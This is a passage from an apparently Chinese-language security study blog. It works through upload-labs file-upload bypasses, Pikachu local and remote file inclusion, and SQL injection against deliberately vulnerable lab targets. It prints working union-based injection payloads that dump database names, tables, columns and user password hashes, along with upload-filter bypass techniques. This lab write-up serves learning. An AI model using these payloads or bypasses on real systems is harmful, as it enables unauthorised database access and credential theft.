<span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>创造了一个类来进行判断，类的php代码在myupload.php，过程如下。。</p><p>isUploadedFile，判断指定的文件是否是通过 HTTP POST 上传的。</p><pre><code>function isUploadedFile()&#123;if( is_uploaded_file( $this-&gt;cls_tmp_filename ) != true )&#123;  return &quot;IS_UPLOADED_FILE_FAILURE&quot;;&#125; else &#123;  return 1;&#125;&#125;</code></pre><p>setDir( $dir )，检测目录</p><p>checkExtension()，检测后缀名是否满足白名单。</p><pre><code>function checkExtension()&#123;// Check if the extension is validif( !in_array( strtolower( strrchr( $this-&gt;cls_filename, &quot;.&quot; )), $this-&gt;cls_arr_ext_accepted ))&#123;    return &quot;EXTENSION_FAILURE&quot;;&#125; else &#123;    return 1;&#125;&#125;</code></pre><p>checkSize()，判断是否超过设置的最大文件大小。</p><pre><code>function checkSize()&#123;if( $this-&gt;cls_filesize &gt; $this-&gt;cls_max_filesize )&#123;  return &quot;FILE_SIZE_FAILURE&quot;;&#125; else &#123;  return 1;&#125;&#125;</code></pre><p>判断文件是否存在，默认不存在。<br>    if( $this-&gt;cls_file_exists == 1 ){</p><pre><code>  $ret = $this-&gt;checkFileExists();  if( $ret != 1 )&#123;    return $this-&gt;resultUpload( $ret );      &#125;&#125;</code></pre><p>move()，上传文件到服务器。</p><pre><code>function move()&#123;if( move_uploaded_file( $this-&gt;cls_tmp_filename, $this-&gt;cls_upload_dir . $this-&gt;cls_filename ) == false )&#123;  return &quot;MOVE_UPLOADED_FILE_FAILURE&quot;;&#125; else &#123;  return 1;&#125;&#125;</code></pre><p>renameFile()，重命名文件。</p><pre><code>function renameFile()&#123;// if no new name was provided, we useif( $this-&gt;cls_file_rename_to == &#39;&#39; )&#123;    $allchar = &quot;abcdefghijklnmopqrstuvwxyz&quot; ;     $this-&gt;cls_file_rename_to = &quot;&quot; ;     mt_srand (( double) microtime() * 1000000 );     for ( $i = 0; $i&lt;8 ; $i++ )&#123;    $this-&gt;cls_file_rename_to .= substr( $allchar, mt_rand (0,25), 1 ) ;     &#125;&#125;    // Remove the extension and put it back on the new file name$extension = strrchr( $this-&gt;cls_filename, &quot;.&quot; );$this-&gt;cls_file_rename_to .= $extension;if( !rename( $this-&gt;cls_upload_dir . $this-&gt;cls_filename, $this-&gt;cls_upload_dir . $this-&gt;cls_file_rename_to ))&#123;    return &quot;RENAME_FAILURE&quot;;&#125; else &#123;    return 1;&#125;&#125;</code></pre><p>本样例不会删除文件，同样是先上传，然后重命名，所以可以采用条件竞争，但是有白名单限制，所以只能上传图片码，但是这样就用不着条件竞争了，而且也没文件包含漏洞呀，所以可能有点问题。</p><p>但是条件竞争可以实现，但是路径有问题，作者写php时应该忽略了个/。<br><img src="https://s2.loli.net/2022/02/09/MwUdbxZOFtIfkYH.png"></p><h3 id="Pass-19系统命名绕过"><a href="#Pass-19系统命名绕过" class="headerlink" title="Pass-19系统命名绕过"></a>Pass-19系统命名绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>黑名单，可以自定义文件名称，还有这种好事，绕过的方式就多了，系统命名绕过的方式都差不多可以，还有00截断。</p><h3 id="Pass-21-数组名称绕过"><a href="#Pass-21-数组名称绕过" class="headerlink" title="Pass-21-数组名称绕过"></a>Pass-21-数组名称绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先是检查了下MIME-TYPE，这个好办，然后判断是否重新修改了文件名，也就是$_POST[‘save_name’]，我们自己发送的，然后判断是否是个数组，如果不是数组，就以.为间隔，生成一个数组，然后取最后一个元素去判断是不是有效后缀。然后以第一个元素+.+最后一个元素组成新文件名。</p><p>这种我们就可以采用数组拼接的方式绕过，我们在抓包后，自主修改post的save_name，使其变为一个数组，然后特意将中间留空，这样重命名时，就不会读取到最后的后缀了。具体原因，没太搞懂，按道理，确实应该也会有后缀的，除非是数组长度变了，但是就算是</p><pre><code>&lt;?php$cars=array(&quot;Volvo&quot;,&quot;&quot;,&quot;Toyota&quot;);echo count($cars);?&gt;</code></pre><p>结果也是3呀，说明数组长度没变，就感觉比较怪。<br><img src="https://s2.loli.net/2022/02/10/YdkOABNs496VKib.png"></p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">https://blog.csdn.net/weixin_44677409/article/details/92799366</a></p><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">https://blog.csdn.net/Thunderclap_/article/details/108948611</a></p><p><a href="https://cloud.tencent.com/developer/article/1740497">https://cloud.tencent.com/developer/article/1740497</a></p><p><a href="https://blog.csdn.net/qq_42812036/article/details/88998783">常见php函数</a></p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>pikachu靶场搭建<a href="https://blog.csdn.net/weixin_51446936/article/details/117789696">https://blog.csdn.net/weixin_51446936/article/details/117789696</a></p><p>解决pikachu不能抓包的问题，Firefox中与 localhost、127.0.0.1/8 和 ::1 的连接永不经过代理，所以我们通过局域网的ip地址访问本地靶场即可。局域网ip地址可通过命令行查看ipconfig，IPv4 地址。</p><p>之前学文件上传漏洞的图片马中已经学到了简单的文件包含漏洞。</p><p>下面是pikachu对文件包含漏洞的概念介绍，通俗易懂，还是比较简单。</p><pre><code>File Inclusion(文件包含漏洞)概述文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：include(),include_once()require(),require_once()这些文件包含函数，这些函数在代码设计中被经常使用到。大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。你可以通过“File Inclusion”对应的测试栏目，来进一步的了解该漏洞。</code></pre><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><p>界面叫我们随便提交一个球星名字，然后，会显示球员的一些信息。<br><img src="https://s2.loli.net/2022/02/10/WACRYyN8dutnjhM.png"><br>可以发现都是通过get传参赋予file变量具体文件名称来访问文件。且多试几次都会发现名称都有规律file1.php，file2.php，file3.php。。。</p><p>利用bp的Intuder爆破。<br><img src="https://s2.loli.net/2022/02/10/mjqCAtswRbnNkPf.png"><br>可以看到当文件为file6.php时，泄露了密码和文件，当然，只要我们知道这个服务器包含的文件位置，也就是其本地文件，我们都可以进行访问执行。</p><h3 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h3><p>先将php.ini中的allow_url_include设置为On。</p><p>感觉没什么好说的，就是可以把本地文件变成攻击机上的webshell了。就是需要在攻击机先配好环境。</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p><p>实际上本质就是如果对我们输入的内容不严格过滤，然后我们就通过输入构造恶意的sql语句，使服务器向数据访问层发起恶意sql请求，然后产生相应回显，使得我们可以获得部分数字全部数据库的内容。</p><h3 id="sql常见语句"><a href="#sql常见语句" class="headerlink" title="sql常见语句"></a>sql常见语句</h3><p>先还是要对常见的sql语句增删查改有个了解。</p><p>创建数据库</p><pre><code>CREATE DATABASE 数据库名;example：mysql&gt; create DATABASE mytable;</code></pre><p>删除数据库</p><pre><code>drop database &lt;数据库名&gt;;example：mysql&gt; drop DATABASE mytable;</code></pre><p>选择数据库</p><pre><code>use 数据库名;example：mysql&gt; use mytable;</code></pre><p>创建数据表</p><pre><code>CREATE TABLE table_name (column_name column_type);//表字段名，和定义类型和值CREATE TABLE IF NOT EXISTS `runoob_tbl`(   `runoob_id` INT UNSIGNED AUTO_INCREMENT,   `runoob_title` VARCHAR(100) NOT NULL,   `runoob_author` VARCHAR(40) NOT NULL,   `submission_date` DATE,   PRIMARY KEY ( `runoob_id` )//设置runoob_id为主键)ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></pre><p>删除数据表</p><pre><code>DROP TABLE table_name ;example：mysql&gt; DROP TABLE mytable;</code></pre><p>插入数据</p><pre><code>INSERT INTO table_name ( field1, field2,...fieldN )//field代表字段名称                       VALUES                       ( value1, value2,...valueN );//value代表值example：mysql&gt; INSERT INTO runoob_tbl     -&gt; (runoob_title, runoob_author, submission_date)    -&gt; VALUES    -&gt; (&quot;学习 PHP&quot;, &quot;菜鸟教程&quot;, NOW());Query OK, 1 rows affected, 1 warnings (0.01 sec)mysql&gt; INSERT INTO runoob_tbl    -&gt; (runoob_title, runoob_author, submission_date)    -&gt; VALUES    -&gt; (&quot;学习 MySQL&quot;, &quot;菜鸟教程&quot;, NOW());Query OK, 1 rows affected, 1 warnings (0.01 sec)mysql&gt; INSERT INTO runoob_tbl    -&gt; (runoob_title, runoob_author, submission_date)    -&gt; VALUES    -&gt; (&quot;JAVA 教程&quot;, &quot;RUNOOB.COM&quot;, &#39;2016-05-06&#39;);Query OK, 1 rows affected (0.00 sec)</code></pre><p>查询数据</p><pre><code>SELECT column_name,column_name //查询的字段，可以是*代表所有字段FROM table_name //数据表名称[WHERE Clause] //条件选择[LIMIT N][ OFFSET M] //LIMIT 属性来设定返回的记录数。 OFFSET指定SELECT语句开始查询的数据偏移量。默认情况下偏移量为0。example:select * from runoob_tbl; //查询整个表</code></pre><p>UPDATE 更新</p><pre><code>UPDATE table_name SET field1=new-value1, field2=new-value2[WHERE Clause]</code></pre><p>WHERE 子句，条件选择</p><pre><code>SELECT field1, field2,...fieldN FROM table_name1, table_name2...[WHERE condition1 [AND [OR]] condition2.....//field为字段名称，可以查询多个字段，查询多个表，condition为条件，and和or就是且和或的意思。</code></pre><p>LIKE 子句，进行相似比较。</p><pre><code>SELECT field1, field2,...fieldN FROM table_nameWHERE field1 LIKE condition1 [AND [OR]] filed2 = &#39;somevalue&#39;example：mysql&gt; SELECT * from runoob_tbl  WHERE runoob_author LIKE &#39;%COM&#39;;</code></pre><p>UNION 操作符，UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。</p><pre><code>SELECT expression1, expression2, ... expression_nFROM tables[WHERE conditions]UNION [ALL | DISTINCT] //默认为DISTINCT，删除重复的。设置为ALL则不会删除重复的。SELECT expression1, expression2, ... expression_nFROM tables[WHERE conditions];example：SELECT country FROM WebsitesUNION ALLSELECT country FROM appsORDER BY country;</code></pre><p>ORDER BY 子句，对读取的数据进行排序。</p><pre><code>SELECT field1, field2,...fieldN FROM table_name1, table_name2...ORDER BY field1 [ASC [DESC][默认 ASC]], [field2...] [ASC [DESC][默认 ASC]]//对多个字段进行排序时，排序的第一个字段必须有相同的值，才会对第二个字段进行排序。如果第一个字段数据中所有的值都是唯一的，MySQL 将不再对第二个字段进行排序。</code></pre><p>常见sql爆破信息语句，主要是利用mysql中的information_schema 结构用来存储数据库系统信息。</p><pre><code>爆所有数据库名select group_concat(SCHEMA_NAME) from information_schema.schemata得到当前库的所有表select group_concat(table_name) from information_schema.tables where table_schema=database()得到表中的字段名select group_concat(column_name) from information_schema.columns where table_name=xxxx</code></pre><h3 id="数字性注入-post"><a href="#数字性注入-post" class="headerlink" title="数字性注入-post"></a>数字性注入-post</h3><p>使用HackBar，进行post传参。</p><p>由于是数值型注入，所以就不需要进行使用’进行闭合。常见的数字查找的sql语句为。</p><pre><code>select xxcolumns from xxtable where id=input</code></pre><p>而且这个样例，提供了6个选项，所以可以采用这样的输入来得到列的有几列</p><pre><code>1 order by n#  //n代表1~n，一个一个试 如果到哪报错了则n-1即为 列数。n后面的#号代表注释，相当于到这后面的内容就是注释了不执行。//select xxcolumns from xxtable where id=id=1 order by 3#&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>然后就会产生这样的回显<br><img src="https://s2.loli.net/2022/02/26/vLnzEFfktTaHiqM.png"><br>所以可以推断出这个表的列为2。</p><p>接下来继续使用union联合查询，database()代表当前网站所使用的数据库名字，user()将会返回执行当前查询的用户名</p><pre><code>id=1 union select database(),user()#&amp;submit=%E6%9F%A5%E8%AF%A2select xxcolumns from xxtable where id=1 union select database(),user()#&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>回显为，所以网站数据库名称为pikachu ，我们当前查询的用户名为root@localhost</p><pre><code>hello,vinceyour email is: vince@pikachu.comhello,pikachuyour email is: root@localhost</code></pre><p>获得所有数据表名称</p><pre><code>id=1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>得到，httpinfo,member,message,users,xssblind ，可以推断出我们的表为users这个数据表。</p><p>接下来爆users表的所有字段。</p><pre><code>id=1 union select group_concat(column_name),1 from information_schema.columns where table_name=&#39;users&#39;#&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>得到USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level。</p><p>找到了两个字段名username，password，获得数据。</p><pre><code>id=1 union select username,password from users#&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p><img src="https://s2.loli.net/2022/02/26/l7NVpFZDWc4YPQb.png"><br>密码为md5加密，可以尝试爆破。</p><h3 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入-get"></a>字符型注入-get</h3><p>由于是字符串型数据，所以需要闭合下。使用的是get传参</p><p>如果我们正常输入hello，则其sql语句可能就是这样。</p><pre><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;hello&#39;;</code></pre><p>这时候我们就可以采用下面的输入来使’引号闭合，并且添加union联合查询。</p><pre><code>hello&#39; union select database(),user()#&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>然后其他的实际上和前面差不多。</p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>这里涉及到了mysql语句的like语句。</p><p>正常的like语句。</p><pre><code>SELECT * from users  WHERE user_name LIKE &#39;%xxx&#39;; //%代表任意字符，所以可能不止一个。</code></pre><p>所以闭合就可能不同了，可能是%’，或者是%%’。一般是多试，或者根据回显来判断。但是实际上感觉一个’完全可以闭包呀。</p><p>这里我们先尝试’</p><pre><code>hello&#39;#回显：并没有报错</code></pre><p>同样步骤</p><pre><code>1&#39; order by 4#Unknown column &#39;4&#39; in &#39;order clause&#39;</code></pre><p>所以列为3。爆破数据表名。</p><pre><code>id=1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#用户名中含有id=1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#的结果如下：username：1uid:2email is: httpinfo,member,message,users,xssblind</code></pre><p>爆破users所有字段名。</p><pre><code>id=1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;#用户名中含有id=1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;#的结果如下：username：1uid:2email is: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level</code></pre><h3 id="xx型注入"><a href="#xx型注入" class="headerlink" 